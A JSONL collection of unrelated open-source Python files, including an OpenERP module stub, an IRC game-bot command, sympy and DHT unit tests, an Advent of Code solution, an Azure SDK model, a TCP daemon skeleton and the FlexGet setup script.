{"text": "# -*- encoding: utf-8 -*-\n#\n#    Module Writen to OpenERP, Open Source Management Solution\n#\n#    Copyright (c) 2013 Vauxoo - http://www.vauxoo.com/\n#    All Rights Reserved.\n#    info Vauxoo (info@vauxoo.com)\n#\n#    Coded by: Jorge Angel Naranjo (jorge_nr@vauxoo.com)\n#\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\nfrom openerp.osv import osv, fields\nfrom openerp.tools.translate import _\n\n\nclass project_phase(osv.Model):\n    _inherit = 'project.phase'\n    \n    _columns = {\n    'description':fields.text('Description'),\n    }\n    \nclass project_task(osv.Model):\n    _inherit = 'project.task'\n\n"}
{"text": "\"\"\"\nLoadable.Loadable subclass\n\"\"\"\n\n# This file is part of Munin.\n\n# Munin is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n\n# Munin is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n\n# You should have received a copy of the GNU General Public License\n# along with Munin; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301  USA\n\n# This work is Copyright (C)2006 by Andreas Jacobsen\n# Individual portions may be copyright by individual contributors, and\n# are included in this collective work with permission of the copyright\n# owners.\n\n\nimport re\nimport datetime\nfrom munin import loadable\n\n\nclass launch(loadable.loadable):\n    def __init__(self, cursor):\n        super().__init__(cursor, 1)\n        self.paramre = re.compile(r\"^\\s*(\\S+|\\d+)\\s+(\\d+)\")\n        self.usage = self.__class__.__name__ + \" <class|eta> <land_tick>\"\n        self.helptext = [\n            \"Calculate launch tick, launch time, prelaunch tick and prelaunch modifier for a given ship class or eta, and land tick.\"\n        ]\n\n        self.class_eta = {\"fi\": 8, \"co\": 8, \"fr\": 9, \"de\": 9, \"cr\": 10, \"bs\": 10}\n\n    def execute(self, user, access, irc_msg):\n\n        if access < self.level:\n            irc_msg.reply(\"You do not have enough access to use this command\")\n            return 0\n\n        m = self.paramre.search(irc_msg.command_parameters)\n        if not m:\n            irc_msg.reply(\"Usage: %s\" % (self.usage,))\n            return 0\n\n        eta = m.group(1)\n        land_tick = int(m.group(2))\n\n        if eta.lower() in list(self.class_eta.keys()):\n            eta = self.class_eta[eta.lower()]\n        else:\n            try:\n                eta = int(eta)\n            except ValueError:\n                irc_msg.reply(\"Usage: %s\" % (self.usage,))\n                return 0\n\n        current_tick = self.current_tick(irc_msg.round)\n\n        current_time = datetime.datetime.utcnow()\n        launch_tick = land_tick - eta\n        launch_time = current_time + datetime.timedelta(\n            hours=(launch_tick - current_tick)\n        )\n        prelaunch_tick = land_tick - eta + 1\n        prelaunch_mod = launch_tick - current_tick\n\n        irc_msg.reply(\n            \"eta %d landing pt %d (currently %d) must launch at pt %d (%s), or with prelaunch tick %d (currently %+d)\"\n            % (\n                eta,\n                land_tick,\n                current_tick,\n                launch_tick,\n                (launch_time.strftime(\"%m-%d %H:55\")),\n                prelaunch_tick,\n                prelaunch_mod,\n            )\n        )\n\n        return 1\n"}
{"text": "import abc\n\n\nclass DNABase(metaclass=abc.ABCMeta):\n    '''\n    DNABase is the base class for all dna. It defines the abstract methods that\n    all DNA should have, as well as an __lt__ method for sorting.\n    '''\n    __slots__ = ()\n\n    #TODO: Add helpers for calling type(self)(...) everywhere\n    @abc.abstractmethod\n    def mutate(self, mask):\n        '''\n        This method should return a DNA object that is the result of applying\n        the mutation mask to each component of this DNA. It is allowed to\n        return self if and only if the mask application doesn't change the dna\n        at all.\n        '''\n        pass\n\n    @abc.abstractmethod\n    def combine(self, other, mask):\n        '''\n        Return a tuple of two new DNAs that are the result of combining this\n        DNA with other, using the mask.\n        '''\n        pass\n\n    @classmethod\n    def total_length(cls):\n        '''\n        This method is provided for backwards compatibility, and returns the\n        total length of this DNA. For DNA with subcomponents, this is the sum\n        of the lengths of the subcomponents. This is now computed beforehand\n        and stored in a class-scope variable. Deprecated.\n        '''\n        return cls.static_length\n\n\ndef combine_element_pairs(pairs):\n    '''\n    When given an iterable that returns pairs- such as\n    [(1, 2), (3, 4), (5, 6)] combine them into a pair of iterables, such as\n    ((1, 3, 5), (2, 4, 6))\n    '''\n\n    return tuple(zip(*pairs))\n"}
{"text": "\"\"\"\nhttp://adventofcode.com/day/10\n\n--- Day 11: Corporate Policy ---\n\nSanta's previous password expired, and he needs help choosing a new one.\n\nTo help him remember his new password after the old one expires, Santa has\ndevised a method of coming up with a password based on the previous one.\nCorporate policy dictates that passwords must be exactly eight lowercase letters\n(for security reasons), so he finds his new password by incrementing his old\npassword string repeatedly until it is valid.\n\nIncrementing is just like counting with numbers: xx, xy, xz, ya, yb, and so on.\nIncrease the rightmost letter one step; if it was z, it wraps around to a, and\nrepeat with the next letter to the left until one doesn't wrap around.\n\nUnfortunately for Santa, a new Security-Elf recently started, and he has imposed\nsome additional password requirements:\n\n    - Passwords must include one increasing straight of at least three letters,\n      like abc, bcd, cde, and so on, up to xyz. They cannot skip letters; abd\n      doesn't count.\n    - Passwords may not contain the letters i, o, or l, as these letters can be\n      mistaken for other characters and are therefore confusing.\n    - Passwords must contain at least two different, non-overlapping pairs of\n      letters, like aa, bb, or zz.\n\nFor example:\n\n    - hijklmmn meets the first requirement (because it contains the straight\n      hij) but fails the second requirement (because it contains i and l).\n    - abbceffg meets the third requirement (because it repeats bb and ff) but\n      fails the first requirement.\n    - abbcegjk fails the third requirement, because it only has one double\n      letter (bb).\n    - The next password after abcdefgh is abcdffaa.\n    - The next password after ghijklmn is ghjaabcc, because you eventually skip\n      all the passwords that start with ghi..., since i is not allowed.\n\nGiven Santa's current password (your puzzle input), what should his next\npassword be?\n\n--- Part Two ---\n\nSanta's password expired again. What's the next one?\n\n\"\"\"\nimport re\nfrom string import ascii_lowercase\n\n\ndef find_next_password(password, n=1):\n    for i in range(n):\n        password = increment_password(password)\n        while not validate(password):\n            password = increment_password(password)\n    return password\n\n\ndef validate(password):\n    # Requirement 2\n    if re.search(r\"[iol]\", password):\n        return False\n\n    # Requirement 1\n    for i in range(len(password) - 2):\n        if password[i:i+3] in ascii_lowercase:\n            break\n    else:\n        return False\n\n    # Requirement 3\n    return True if re.search(r\"(\\w)\\1.*(\\w)\\2\", password) else False\n\n\ndef increment_password(password):\n    if password.endswith(\"z\"):\n        i_z = password.index(\"z\")\n        n_z = len(password) - i_z\n        boundary_letter = password[i_z - 1]\n        return password[:i_z - 1] + next_letter(boundary_letter) + \"a\" * n_z\n    else:\n        return password[:-1] + next_letter(password[-1])\n\n\ndef next_letter(c):\n    try:\n        return ascii_lowercase[ascii_lowercase.index(c) + 1]\n    except IndexError:  # z\n        return \"a\"\n\n\ndef part_one():\n    with open(\"inputs/day_11_input.txt\") as fin:\n        password = fin.readline().strip()\n    print(\"Next password: {}\".format(find_next_password(password)))\n\n\ndef part_two():\n    with open(\"inputs/day_11_input.txt\") as fin:\n        password = fin.readline().strip()\n    print(\"Next password: {}\".format(find_next_password(password, 2)))\n\n\ndef main():\n    with open(\"inputs/day_11_input.txt\") as fin:\n        password = fin.readline().strip()\n    next_password = find_next_password(password)\n    print(\"Next password: {}\".format(next_password))\n    print(\"Next next password: {}\".format(find_next_password(next_password)))\n\n\nif __name__ == \"__main__\":\n    main()\n"}
{"text": "from sympy.combinatorics.partitions import (Partition, IntegerPartition,\n                                            RGS_enum, RGS_unrank, RGS_rank,\n                                            random_integer_partition)\nfrom sympy.utilities.pytest import raises\nfrom sympy.utilities.iterables import default_sort_key, partitions\n\n\ndef test_partition():\n    from sympy.abc import x\n\n    raises(ValueError, lambda: Partition(range(3)))\n    raises(ValueError, lambda: Partition([[1, 1, 2]]))\n\n    a = Partition([[1, 2, 3], [4]])\n    b = Partition([[1, 2], [3, 4]])\n    c = Partition([[x]])\n    l = [a, b, c]\n    l.sort(key=default_sort_key)\n    assert l == [c, a, b]\n    l.sort(key=lambda w: default_sort_key(w, order='rev-lex'))\n    assert l == [c, a, b]\n\n    assert (a == b) is False\n    assert a <= b\n    assert (a > b) is False\n    assert a != b\n\n    assert (a + 2).partition == [[1, 2], [3, 4]]\n    assert (b - 1).partition == [[1, 2, 4], [3]]\n\n    assert (a - 1).partition == [[1, 2, 3, 4]]\n    assert (a + 1).partition == [[1, 2, 4], [3]]\n    assert (b + 1).partition == [[1, 2], [3], [4]]\n\n    assert a.rank == 1\n    assert b.rank == 3\n\n    assert a.RGS == (0, 0, 0, 1)\n    assert b.RGS == (0, 0, 1, 1)\n\n\ndef test_integer_partition():\n    # no zeros in partition\n    raises(ValueError, lambda: IntegerPartition(range(3)))\n    # check fails since 1 + 2 != 100\n    raises(ValueError, lambda: IntegerPartition(100, range(1, 3)))\n    a = IntegerPartition(8, [1, 3, 4])\n    b = a.next_lex()\n    c = IntegerPartition([1, 3, 4])\n    d = IntegerPartition(8, {1: 3, 3: 1, 2: 1})\n    assert a == c\n    assert a.integer == d.integer\n    assert a.conjugate == [3, 2, 2, 1]\n    assert (a == b) is False\n    assert a <= b\n    assert (a > b) is False\n    assert a != b\n\n    for i in range(1, 11):\n        next = set()\n        prev = set()\n        a = IntegerPartition([i])\n        ans = set([IntegerPartition(p) for p in partitions(i)])\n        n = len(ans)\n        for j in range(n):\n            next.add(a)\n            a = a.next_lex()\n            IntegerPartition(i, a.partition)  # check it by giving i\n        for j in range(n):\n            prev.add(a)\n            a = a.prev_lex()\n            IntegerPartition(i, a.partition)  # check it by giving i\n        assert next == ans\n        assert prev == ans\n\n    assert IntegerPartition([1, 2, 3]).as_ferrers() == '###\\n##\\n#'\n    assert IntegerPartition([1, 1, 3]).as_ferrers('o') == 'ooo\\no\\no'\n    assert str(IntegerPartition([1, 1, 3])) == '[3, 1, 1]'\n    assert IntegerPartition([1, 1, 3]).partition == [3, 1, 1]\n\n    raises(ValueError, lambda: random_integer_partition(-1))\n    assert random_integer_partition(1) == [1]\n    assert random_integer_partition(10, seed=[1, 3, 2, 1, 5, 1]\n            ) == [5, 2, 1, 1, 1]\n\n\ndef test_rgs():\n    raises(ValueError, lambda: RGS_unrank(-1, 3))\n    raises(ValueError, lambda: RGS_unrank(3, 0))\n    raises(ValueError, lambda: RGS_unrank(10, 1))\n\n    raises(ValueError, lambda: Partition.from_rgs(range(3), range(2)))\n    raises(ValueError, lambda: Partition.from_rgs(range(1, 3), range(2)))\n    assert RGS_enum(-1) == 0\n    assert RGS_enum(1) == 1\n    assert RGS_unrank(7, 5) == [0, 0, 1, 0, 2]\n    assert RGS_unrank(23, 14) == [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 2, 2]\n    assert RGS_rank(RGS_unrank(40, 100)) == 40\n"}
{"text": "import client\nimport requests\n\n\ndef read_config(config_files, **predata):\n    cfg = {}\n    for config_file in config_files:\n        cfg.update(_read_config_file(\n            config_file, predata))\n    return cfg\n\n\ndef _read_config_file(_config_file, predata):\n    _file = open(_config_file)\n    exec(_file, globals(), predata)\n    _file.close()\n\n    for _k, _v in predata.iteritems():\n        if not _k.startswith('_'):\n            yield _k, _v\n    for _k, _v in locals().iteritems():\n        if not _k.startswith('_'):\n            yield _k, _v\n\n\nclass SiteList(object):\n\n    def __init__(self):\n        self.sites = {}\n\n    def __getitem__(self, key):\n        if key not in self.sites:\n            self.sites[key] = {}\n        return self.sites[key]\n\n    def __iter__(self):\n        return self.sites.itervalues()\n\n\nclass ConfiguredSite(client.Site):\n\n    def __init__(self, *config_files, **kwargs):\n        self.config = read_config(config_files, sites=SiteList())\n\n        if 'name' in kwargs:\n            self.config.update(self.config['sites'][kwargs['name']])\n\n        do_login = 'username' in self.config and 'password' in self.config\n\n        super(ConfiguredSite, self).__init__(\n            host=self.config['host'],\n            path=self.config['path'],\n            ext=self.config.get('ext', '.php'),\n            do_init=not do_login,\n            retry_timeout=self.config.get('retry_timeout', 30),\n            max_retries=self.config.get('max_retries', -1),\n        )\n\n        if do_login:\n            self.login(self.config['username'],\n                       self.config['password'])\n\n\nclass ConfiguredPool(list):\n\n    def __init__(self, *config_files):\n        self.config = read_config(config_files, sites=SiteList())\n        self.pool = requests.Session()\n\n        config = dict([(k, v) for k, v in self.config.iteritems()\n                       if k != 'sites'])\n\n        for site in self.config['sites']:\n            cfg = config.copy()\n            cfg.update(site)\n            site.update(cfg)\n\n            do_login = 'username' in site and 'password' in site\n\n            self.append(client.Site(host=site['host'],\n                                    path=site['path'], ext=site.get('ext', '.php'),\n                                    pool=self.pool, do_init=not do_login,\n                                    retry_timeout=site.get('retry_timeout', 30),\n                                    max_retries=site.get('max_retries', -1)))\n            if do_login:\n                self[-1].login(site['username'], site['password'])\n            self[-1].config = site\n"}
{"text": "#!/usr/bin/env python\n# encoding: utf-8\n\"\"\"\nvecsearch.py\n\nCreated by mikepk on 2010-05-30.\nCopyright (c) 2010 Michael Kowalchik. All rights reserved.\n\"\"\"\n\nimport sys\nimport os\nimport unittest\n\nimport getopt\nfrom Daemon import Daemon\n\nimport signal\nimport socket\nimport threading\nimport SocketServer\nimport time\n\n# standard python logging\nimport logging\nimport logging.handlers\n\n#sys.path.append( os.path.dirname( os.path.realpath( __file__ ) ) )\n\nsys.argv[0] = 'vecsearch'\n\n\nclass Logger:\n    def __init__(self,log_file = '/tmp/vecsearch.log'):\n\n        LOG_FILENAME = log_file\n\n        # Set up a specific logger with our desired output level\n        self.my_logger = logging.getLogger('VecSearch')\n        self.my_logger.setLevel(logging.DEBUG)\n\n        # Add the log message handler to the logger\n        handler = logging.handlers.RotatingFileHandler(\n                      LOG_FILENAME, \n                      maxBytes=1024*1024*20, \n                      backupCount=10)\n\n        # create formatter\n        formatter = logging.Formatter(\"%(asctime)s - %(levelname)s - %(message)s\")\n        # add formatter to handler\n        handler.setFormatter(formatter)\n        self.my_logger.addHandler(handler)\n        self.write(\"Logging Started\")\n        \n    def write(self,msg):\n        if msg == '\\n':\n            return\n        # msg = msg.rstrip()\n        # self.my_logger.debug(repr(msg))\n        self.my_logger.debug(msg)\n\n\n\nclass ThreadedTCPRequestHandler(SocketServer.StreamRequestHandler):\n        \n    def handle(self):\n        # data = self.request.recv(1024)\n        data = ''\n        while not data:\n            self.wfile.write(\"READY: \")\n            data = self.rfile.readline().strip()\n\n        self.server.logger.write(\"Received %s\" % data)\n\n        # execute index, query or compare command\n\n        response = \"%s\\n\" % data\n\n        self.wfile.write(response)\n        \n\nclass ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):\n    pass\n\n\n\nclass Query():\n    '''Execute queries.'''\n    def __init__(self,logger):\n        self.command_lock = threading.Lock()\n        self.logger = logger\n        self.command_queue = []\n        \n    def work(self):\n        self.logger.write(\"Starting query thread.\\n\")\n        while 1:\n            try:\n                data = ''\n                self.command_lock.acquire()\n                if self.command_queue:\n                    data = self.command_queue.pop(0)\n                self.command_lock.release()\n                if data == 'q':\n                    self.logger.write(\"Running Command: %s\\n\" % str(data))\n                elif data == 'email':\n                    self.logger.write(\"Running Command: %s\\n\" % str(data))\n            except Exception,err:\n                self.logger.write(\"An error occured\\n\")\n                #self.logger.flush()                \n                self.logger.write('%s\\nError occured\\n-------------------\\n%s\\n' % (str(sys.exc_info()),str(err)))\n                #self.logger.flush()\n            time.sleep(1)\n\n\nclass VecSearchServer(Daemon):\n    '''The Vector Search server.'''\n    def __init__(self, pidfile, stdin='/dev/null', stdout='/dev/null', stderr='/dev/null', log=None):\n        Daemon.__init__(self, pidfile, stdin, stdout, stderr)\n        self.logger = log\n\n    def run(self):\n        HOST, PORT = \"localhost\", 7500\n\n        self.logger.write(\"Starting the search server\\n=====================\\n\")\n\n        server = ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler)\n        \n        ip, port = server.server_address\n\n        server.logger = self.logger\n        #server.worker = Query(self.logger)\n\n        #worker_thread = threading.Thread(target=server.worker.work)\n        #worker_thread.start()\n\n        signal.signal(signal.SIGHUP,  lambda *args: self.restart())\n        signal.signal(signal.SIGTERM,  lambda *args: self.stop())\n        signal.signal(signal.SIGQUIT, lambda *args: self.stop())\n\n        # Start a thread with the server -- that thread will then start one\n        # more thread for each request\n        # server_thread = threading.Thread(target=server.serve_forever)\n        server.serve_forever()\n        # Exit the server thread when the main thread terminates\n        # server_thread.setDaemon(True)\n        # server_thread.start()\n\n\ndef main(argv=None):\n    logfile = Logger()\n    vs = VecSearchServer('/var/run/vecsearch.pid',stdout='/var/tmp/log1', stderr='/var/tmp/log2', log=logfile)\n    vs.start()\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n"}
{"text": "# coding=utf-8\n# --------------------------------------------------------------------------\n# Copyright (c) Microsoft Corporation. All rights reserved.\n# Licensed under the MIT License. See License.txt in the project root for\n# license information.\n#\n# Code generated by Microsoft (R) AutoRest Code Generator.\n# Changes may cause incorrect behavior and will be lost if the code is\n# regenerated.\n# --------------------------------------------------------------------------\n\nfrom msrest.serialization import Model\n\n\nclass EncryptionSettings(Model):\n    \"\"\"Encryption settings for disk or snapshot.\n\n    :param enabled: Set this flag to true and provide DiskEncryptionKey and\n     optional KeyEncryptionKey to enable encryption. Set this flag to false and\n     remove DiskEncryptionKey and KeyEncryptionKey to disable encryption. If\n     EncryptionSettings is null in the request object, the existing settings\n     remain unchanged.\n    :type enabled: bool\n    :param disk_encryption_key: Key Vault Secret Url and vault id of the disk\n     encryption key\n    :type disk_encryption_key:\n     ~azure.mgmt.compute.v2016_04_30_preview.models.KeyVaultAndSecretReference\n    :param key_encryption_key: Key Vault Key Url and vault id of the key\n     encryption key\n    :type key_encryption_key:\n     ~azure.mgmt.compute.v2016_04_30_preview.models.KeyVaultAndKeyReference\n    \"\"\"\n\n    _attribute_map = {\n        'enabled': {'key': 'enabled', 'type': 'bool'},\n        'disk_encryption_key': {'key': 'diskEncryptionKey', 'type': 'KeyVaultAndSecretReference'},\n        'key_encryption_key': {'key': 'keyEncryptionKey', 'type': 'KeyVaultAndKeyReference'},\n    }\n\n    def __init__(self, **kwargs):\n        super(EncryptionSettings, self).__init__(**kwargs)\n        self.enabled = kwargs.get('enabled', None)\n        self.disk_encryption_key = kwargs.get('disk_encryption_key', None)\n        self.key_encryption_key = kwargs.get('key_encryption_key', None)\n"}
{"text": "#!/usr/bin/python\n#\n# Copyright 2014 Google Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n################################################################################\n#\n# Tests for functionality in the proxy.py file.\n\nimport proxy\nimport unittest\n\n\nclass GetTargetUrlTest(unittest.TestCase):\n  def testSimple(self):\n    cases = [\n      ('foo/bar', '/?q=foo/bar'),\n      ('/home/~user', '/?q=/home/%7Euser')\n    ]\n    for expected, path in cases:\n      actual = proxy.GetTargetUrl(path)\n      if expected != actual:\n        print 'Failed conversion for %s' % path\n        print 'expected: %s' % expected\n        print '  actual: %s' % actual\n        self.assertEquals(expected, actual)\n\n\nif __name__ == '__main__':\n  unittest.main()\n"}
{"text": "# Copyright (C) 2009-2010 Raul Jimenez\n# Released under GNU LGPL 2.1\n# See LICENSE.txt for more information\n\nfrom nose.tools import ok_, eq_, assert_raises\n\nfrom socket import inet_aton\n\nimport node\nimport logging, logging_conf\n\nimport test_const as tc\nimport bencode\nimport message as m\nimport message_tools as mt\n\nlogging_conf.testing_setup(__name__)\nlogger = logging.getLogger('dht')\n\n\nclass TestMsgTools:\n\n    def setup(self):\n        pass\n\n    def test_invalid_addresses(self):\n        ips = ['127.0.0.1', '127.24.43.6', '192.168.0.1', '192.168.47.3']\n        for ip in ips:\n            c_addr = mt.compact_addr((ip, 22))\n            assert_raises(mt.AddrError, mt.uncompact_addr, c_addr)\n\n    def test_tools(self):\n        bin_strs = ['23', '\\1\\5', 'a\\3']\n        for bs in bin_strs:\n            i = mt.bin_to_int(bs)\n            bs2 = mt.int_to_bin(i)\n            logger.debug('bs: %s, bin_to_int(bs): %d, bs2: %s' % (bs,\n                                                                   i, bs2))\n            assert bs == bs2\n\n        ips = ['128.0.0.1', '222.222.222.222', '1.2.3.4']\n        ports = [12345, 99, 54321] \n        for addr in zip(ips, ports):\n            c_addr = mt.compact_addr(addr)\n            addr2 = mt.uncompact_addr(c_addr)\n            assert addr == addr2\n\n            c_peers = mt.compact_peers(tc.PEERS)\n            peers = mt.uncompact_peers(c_peers)\n            for p1, p2 in zip(tc.PEERS, peers):\n                assert p1[0] == p2[0]\n                assert p1[0] == p2[0]\n            \n            c_nodes = mt.compact_nodes(tc.NODES)\n            nodes = mt.uncompact_nodes(c_nodes)\n            for n1, n2 in zip(tc.NODES, nodes):\n                assert n1 == n2\n\n        bin_ipv6s = ['\\x00' * 10 + '\\xff\\xff' + '\\1\\2\\3\\4',\n                     '\\x22' * 16,\n                     ]\n        #assert mt.bin_to_ip(bin_ipv6s[0]) == '1.2.3.4'\n        #assert_raises(mt.AddrError, mt.bin_to_ip, bin_ipv6s[1])\n\n\n        IP = '1.2.3.4'\n        PORT = 7777\n        BIN_PORT = mt.int_to_bin(PORT)\n        c_nodes2 = [tc.CLIENT_ID.bin_id + inet_aton(IP) + BIN_PORT]\n        nodes2 = [node.Node((IP, PORT), tc.CLIENT_ID)]\n        logger.debug(mt.uncompact_nodes2(c_nodes2))\n        eq_(mt.uncompact_nodes2(c_nodes2), nodes2)\n        logger.warning(\n            \"**IGNORE WARNING LOG** This exception was raised by a test\")\n       \n\n    def test_tools_error(self):\n        c_nodes = mt.compact_nodes(tc.NODES)\n        # Compact nodes is one byte short\n        eq_(mt.uncompact_nodes(c_nodes[:-1]), [])\n        # Port is 0 (\n        eq_(mt.uncompact_nodes(c_nodes), tc.NODES)\n\n        nodes = [n for n in tc.NODES]\n        # One address has port ZERO\n        nodes[0] = node.Node((nodes[0].addr[0], 0), nodes[0].id)\n        peers = [n.addr for n in nodes]\n\n        c_nodes = mt.compact_nodes(nodes)\n        eq_(mt.uncompact_nodes(c_nodes), nodes[1:])\n        c_nodes2 = mt.compact_nodes2(nodes)\n        eq_(mt.uncompact_nodes2(c_nodes2), nodes[1:])\n        c_peers = mt.compact_peers(peers)\n        eq_(mt.uncompact_peers(c_peers), peers[1:])\n\n        addr = ('1.2.3.4', 1234)\n        c_addr = mt.compact_addr(addr)\n        assert_raises(mt.AddrError, mt.uncompact_addr, c_addr[:-1])\n        assert_raises(mt.AddrError, mt.uncompact_addr, c_addr[1:])\n        assert_raises(mt.AddrError, mt.uncompact_addr, c_addr+'X')\n        \n"}
{"text": "# -*- coding: utf-8 -*-\n'''auto queuing call chain test mixins'''\n\n\nclass AQMixin(object):\n\n    ###########################################################################\n    ## queue manipulation #####################################################\n    ###########################################################################\n\n    def test_repr(self):\n        from stuf.six import strings\n        self.assertTrue(isinstance(\n            self.qclass([1, 2, 3, 4, 5, 6]).__repr__(), strings,\n        ))\n\n    def test_ro(self):\n        self.assertListEqual(\n            self.qclass([1, 2, 3, 4, 5, 6]).ro().peek(), [1, 2, 3, 4, 5, 6],\n        )\n\n    def test_extend(self):\n        self.assertEqual(\n            self.qclass().extend([1, 2, 3, 4, 5, 6]).outsync().end(),\n            [1, 2, 3, 4, 5, 6],\n        )\n\n    def test_outextend(self):\n        self.assertEqual(\n            self.qclass().outextend([1, 2, 3, 4, 5, 6]).end(),\n            [1, 2, 3, 4, 5, 6],\n        )\n\n    def test_extendleft(self):\n        self.assertListEqual(\n            self.qclass().extendleft([1, 2, 3, 4, 5, 6]).outsync().end(),\n            [6, 5, 4, 3, 2, 1]\n        )\n\n    def test_append(self):\n        autoq = self.qclass().append('foo').outsync()\n        self.assertEqual(autoq.end(), 'foo')\n\n    def test_appendleft(self):\n        autoq = self.qclass().appendleft('foo').outsync()\n        self.assertEqual(autoq.end(), 'foo')\n\n    def test_inclear(self):\n        self.assertEqual(len(list(self.qclass([1, 2, 5, 6]).inclear())), 0)\n\n    def test_outclear(self):\n        self.assertEqual(\n            len(list(self.qclass([1, 2, 5, 6]).outclear().outgoing)), 0\n        )\n\n    ###########################################################################\n    ## queue balancing ########################################################\n    ###########################################################################\n\n    def test_insync(self):\n        q = self.qclass([1, 2, 3, 4, 5, 6]).outshift().inclear().shift()\n        self.assertListEqual(list(q.incoming), list(q.outgoing))\n\n    def test_inshift(self):\n        q = self.qclass([1, 2, 3, 4, 5, 6]).outshift().sync()\n        self.assertListEqual(list(q.incoming), list(q.outgoing))\n\n    def test_outsync(self):\n        q = self.qclass([1, 2, 3, 4, 5, 6]).outshift()\n        self.assertListEqual(list(q.incoming), list(q.outgoing))\n\n    def test_outshift(self):\n        q = self.qclass([1, 2, 3, 4, 5, 6]).outsync()\n        self.assertListEqual(list(q.incoming), list(q.outgoing))\n\n    ##########################################################################\n    # queue information ######################################################\n    ##########################################################################\n\n    def test_results(self):\n        self.assertListEqual(\n            list(self.qclass(1, 2, 3, 4, 5, 6).outsync().results()),\n            [1, 2, 3, 4, 5, 6],\n        )\n"}
{"text": "# % ---------------------------------\r\n# % filename: initialize_data_structure.py\r\n# %\r\n# % we set the physical data of the structure.\r\n# %============================================================\r\n# % physical data of the structure\r\n# %===========================================================\r\nimport numpy as np\r\nfrom initialize_data_fluid import *\r\nvprel=np.zeros((2,1))\r\nvprel[0] = 1e7  #% spring rigidity\r\nvprel[1]= 100  #% mass of the piston\r\nLsp0     = 1.2  #% length of the spring (unstretched)\r\nLspe     = Lsp0-(pres_init0-p_ext)*A/vprel[0] #% length at equilibrium\r\n\r\nif(Lspe<=0):\r\n    print(1,'Length of the spring at equilibrium Lspe= %g! meters ! \\n',Le)\r\n    \r\n\r\n\r\n# % ----------------------------------\r\n# % We compute the natural period of the (mass+spring) system\r\n# %\r\nomega0 = np.sqrt(vprel[0]/vprel[1]) #% natural pulsation\r\nfreq0  = omega0/(2*np.pi)       #% natural frequency\r\nT0     = 1/freq0                #% natural period\r\n#%\r\nprint(1,'Piston mass= %g kg \\n',vprel[1])\r\nprint(1,'Spring rigidity= %g N/m \\n',vprel[0])\r\nprint(1,'Natural frequency of the mass-spring system= %g Hz \\n\\n',freq0)\r\n\r\n# % ============================================================\r\n# % Data initialization for the structure\r\n# % ===========================================================\r\n# % beware of the sign of U0\r\n# % u_t is the current displacement of the piston set to the initial displacement\r\n# % u_dot_t  is the current velocity of the piston\r\n# % u_double_dot_t  is the current acceleration of the piston\r\n# %\r\nu_t     = U0\r\nu_dot_t = 0\r\nvsols0  = u_t\r\n# %\r\n# % ------------------------\r\n# % initialization of the acceleration\r\nvfg0             = (vpres[nnt-1]-0*pres_init)*A\r\nu_double_dot_t   = (vfg0+vprel[0]*(Lspe - u_t - Lsp0))/vprel[1]\r\n"}
{"text": "import sys\nfrom pathlib import Path\nfrom typing import List\n\nfrom setuptools import find_packages, setup\n\nlong_description = Path('README.rst').read_text()\n\n# Populates __version__ without importing the package\n__version__ = None\nwith open('flexget/_version.py', encoding='utf-8') as ver_file:\n    exec(ver_file.read())  # pylint: disable=W0122\nif not __version__:\n    print('Could not find __version__ from flexget/_version.py')\n    sys.exit(1)\n\n\ndef load_requirements(filename: str) -> List[str]:\n    return [\n        line.strip()\n        for line in Path(filename).read_text().splitlines()\n        if not line.startswith('#')\n    ]\n\n\nsetup(\n    name='FlexGet',\n    version=__version__,\n    description='FlexGet is a program aimed to automate downloading or processing content (torrents, podcasts, etc.) '\n    'from different sources like RSS-feeds, html-pages, various sites and more.',\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    author='Marko Koivusalo',\n    author_email='marko.koivusalo@gmail.com',\n    license='MIT',\n    url='https://flexget.com',\n    project_urls={\n        'Repository': 'https://github.com/Flexget/Flexget',\n        'Issue Tracker': 'https://github.com/Flexget/Flexget/issues',\n        'Forum': 'https://discuss.flexget.com',\n    },\n    packages=find_packages(exclude=['flexget.tests']),\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=load_requirements('requirements.txt'),\n    tests_require=['pytest'],\n    extras_require={'dev': load_requirements('dev-requirements.txt')},\n    entry_points={\n        'console_scripts': ['flexget = flexget:main'],\n        'gui_scripts': [\n            'flexget-headless = flexget:main'\n        ],  # This is useful on Windows to avoid a cmd popup\n    },\n    python_requires='>=3.6',\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n)\n"}
